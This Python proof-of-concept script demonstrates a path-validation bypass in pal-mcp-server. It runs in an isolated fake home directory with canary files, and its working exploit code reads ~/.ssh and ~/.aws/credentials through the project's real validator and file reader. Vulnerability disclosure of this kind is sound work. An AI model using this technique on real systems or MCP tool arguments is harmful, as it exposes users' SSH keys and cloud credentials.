#!/usr/bin/env python3
"""
PoC: pal-mcp-server path-confinement bypass (arbitrary home-subdir file read).

Runs against an ISOLATED fake $HOME (/tmp/pal-poc-home) with synthetic canaries.
Never touches the real home directory. Exercises the project's REAL validator
(resolve_and_validate_path) and REAL reader (read_file_content), which is the
exact code path the file-consuming MCP tools (analyze/codereview/secaudit/chat)
use on LLM-controlled 'files'/'relevant_files' arguments.

Vuln: resolve_and_validate_path() blocks system dirs (is_relative_to, children
blocked) and the EXACT home root, but applies no PROJECT_ROOT allowlist, so any
home SUBDIRECTORY path (e.g. ~/.ssh/id_rsa, ~/.aws/credentials) passes the gate
and its contents are returned. Same blacklist-bypass class as CVE-2025-66689.
"""
import os
from pathlib import Path

from utils.file_utils import resolve_and_validate_path, read_file_content

HOME = os.environ["HOME"]
assert HOME == "/tmp/pal-poc-home", f"refusing to run outside isolated lab HOME (got {HOME})"

CANARY_SSH = f"{HOME}/.ssh/CANARY"
CANARY_AWS = f"{HOME}/.aws/credentials"
PROJECT_FILE = f"{HOME}/myproject/README.md"
TRAVERSAL = f"{HOME}/myproject/../.ssh/CANARY"   # escapes the "project" dir

def gate(path):
    """Return ('ALLOW', resolved) or ('BLOCK', exc_type)."""
    try:
        r = resolve_and_validate_path(path)
        return ("ALLOW", str(r))
    except Exception as e:
        return ("BLOCK", type(e).__name__)

def reads_secret(path, marker="SYNTHETIC-CANARY"):
    content, _ = read_file_content(path)
    return marker in content, content

print("=" * 78)
print("pal-mcp-server path-confinement bypass  |  isolated lab HOME =", HOME)
print("=" * 78)

rows = []
# (label, input, run, expected_for_PASS)
def check(label, kind, fn, expect, vuln):
    res = fn()
    ok = (res[0] == expect)
    rows.append((label, kind, res, "PASS" if ok else "FAIL", vuln))
    return ok

# Controls: the gate SHOULD protect these. PASS = protection fires.
check("system path /etc/passwd", "control", lambda: gate("/etc/passwd"), "BLOCK", False)
check("home ROOT (whole home)",  "control", lambda: gate(HOME),         "BLOCK", False)
check("relative path",           "control", lambda: gate("relative/x"), "BLOCK", False)
# Legit: a real in-project file should read fine. PASS = it reads.
check("legit project README",    "legit",   lambda: gate(PROJECT_FILE), "ALLOW", False)

# VULN: the gate should NOT allow these, but does. PASS = bypass succeeds.
check("home-subdir ~/.ssh/CANARY",     "VULN", lambda: gate(CANARY_SSH), "ALLOW", True)
check("home-subdir ~/.aws/credentials","VULN", lambda: gate(CANARY_AWS), "ALLOW", True)
check("../ traversal out of project",  "VULN", lambda: gate(TRAVERSAL),  "ALLOW", True)

print(f"{'CASE':<34}{'KIND':<9}{'RESULT':<26}{'VERDICT'}")
print("-" * 78)
for label, kind, res, verdict, vuln in rows:
    flag = "  <-- BYPASS" if (vuln and verdict == "PASS") else ""
    print(f"{label:<34}{kind:<9}{str(res):<26}{verdict}{flag}")

print("\n--- END-TO-END EXFIL via the real read_file_content() reader ---")
for label, p in [("~/.ssh/CANARY", CANARY_SSH), ("~/.aws/credentials", CANARY_AWS)]:
    got, content = reads_secret(p)
    print(f"\n[{label}] secret bytes returned to tool result: {got}")
    snippet = content.strip().splitlines()
    for line in snippet[:6]:
        print("   |", line)

# Overall verdict
vuln_pass = all(r[3] == "PASS" for r in rows if r[4])
ctrl_pass = all(r[3] == "PASS" for r in rows if r[1] == "control")
e2e = reads_secret(CANARY_SSH)[0] and reads_secret(CANARY_AWS)[0]
print("\n" + "=" * 78)
print(f"controls (system/root/relative blocked): {'OK' if ctrl_pass else 'FAIL'}")
print(f"home-subdir bypass (gate allows):        {'OK' if vuln_pass else 'FAIL'}")
print(f"end-to-end secret read via reader:       {'OK' if e2e else 'FAIL'}")
print("VERDICT:", "VULNERABILITY CONFIRMED" if (ctrl_pass and vuln_pass and e2e)
      else "NOT CONFIRMED")
print("=" * 78)
